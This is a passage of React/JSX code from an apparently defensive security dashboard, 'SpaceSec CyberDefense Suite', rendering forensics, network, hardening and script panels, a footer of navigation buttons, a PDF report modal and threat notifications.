        {activeTab === 'deep-excision' && (
          <DeepExcisionPanel onRunInConsole={handleExecuteCommand} />
        )}

        {activeTab === 'forensics' && (
          <MemoryForensicsPanel onRunInConsole={handleExecuteCommand} />
        )}

        {activeTab === 'network' && (
          <NetworkC2Panel onRunInConsole={handleExecuteCommand} />
        )}

        {activeTab === 'hardening' && (
          <HardeningPanel onRunInConsole={handleExecuteCommand} />
        )}

        {activeTab === 'script-hub' && (
          <ScriptWorkshop onDownloadZip={handleDownloadZip} />
        )}
      </main>

      {/* Quiet Clean Footer */}
      <footer className="border-t border-slate-900 bg-slate-950 py-6 px-6 text-center text-xs text-slate-500">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-2">
            <span className="font-semibold text-slate-300">SpaceSec CyberDefense Suite</span>
            <span aria-hidden="true">·</span>
            <span>Édition Kernel v3.0</span>
            <span aria-hidden="true">·</span>
            <span>Développé pour Space [Goat Asta]</span>
          </div>
          <div className="flex items-center gap-4 text-slate-400">
            <button onClick={handleDownloadZip} className="text-cyan-400 hover:text-cyan-300 font-semibold transition-colors">
              Télécharger le ZIP
            </button>
            <button onClick={() => setActiveTab('bits')} className="hover:text-cyan-300 text-slate-300 font-medium transition-colors">
              BITS Task Manager
            </button>
            <button onClick={() => setActiveTab('timeline')} className="hover:text-cyan-300 text-slate-300 font-medium transition-colors">
              Chronologie des Menaces
            </button>
            <button onClick={() => setActiveTab('script-hub')} className="hover:text-slate-200 transition-colors">
              Code Source .ps1
            </button>
            <button onClick={() => setActiveTab('console')} className="hover:text-slate-200 transition-colors">
              Console Interactive
            </button>
            <button onClick={() => setIsPdfModalOpen(true)} className="hover:text-rose-400 text-rose-300 font-semibold transition-colors flex items-center gap-1">
              <span>Rapport Forensique (PDF)</span>
            </button>
          </div>
        </div>
      </footer>

      {/* Forensic PDF Report Modal */}
      <PdfReportModal
        isOpen={isPdfModalOpen}
        onClose={() => setIsPdfModalOpen(false)}
        threats={threats}
        logs={logs}
        onNotifySuccess={(msg) => addLog('OK', msg, 'PDF-REPORT')}
      />

      {/* Persistent Threat Toast Notification Sentinel (Bottom-Right) */}
      <ThreatToastContainer
        toasts={threatToasts}
        onDismiss={handleDismissToast}
        onClearAll={handleClearAllToasts}
        onNavigateTab={setActiveTab}
        onRunInConsole={handleExecuteCommand}
        isSimulationActive={isToastSimulationActive}
        onToggleSimulation={() => setIsToastSimulationActive(!isToastSimulationActive)}
        onTriggerTestThreat={handleTriggerTestThreat}
      />
    </div>
  );
}
